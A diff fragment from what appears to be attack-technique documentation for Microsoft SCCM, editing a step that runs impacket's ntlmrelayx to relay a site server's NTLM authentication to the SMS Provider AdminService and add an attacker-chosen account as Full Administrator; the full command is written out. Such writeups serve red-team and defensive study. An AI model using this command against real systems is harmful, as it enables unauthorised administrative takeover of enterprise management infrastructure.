@@ -61,7 +61,7 @@ This technique may allow an attacker to relay a site server's domain computer ac
                         +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+       
     ```
 
-2. On the attacker relay server, start `ntlmrelayx`, targeting the URL of the AdminService API on the remote SMS Provider identified in the previous step, and provide a target account to add as a Full Administrator:
+2. On the attacker relay server, start `ntlmrelayx` (currently, Garrett Foster's [fork/pull request here](https://github.com/fortra/impacket/pull/1593) must be used until it is merged into impacket), targeting the URL of the AdminService API on the remote SMS Provider identified in the previous step, and provide a target account to add as a Full Administrator:
     ```
     └─# python3 ntlmrelayx.py --adminservice --logonname "lab\specter" --displayname "lab\specter" --objectsid <USER SID> -smb2support -t https://SMS_PROVIDER_URL_OR_IP/AdminService/wmi/SMS_Admin
     Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra
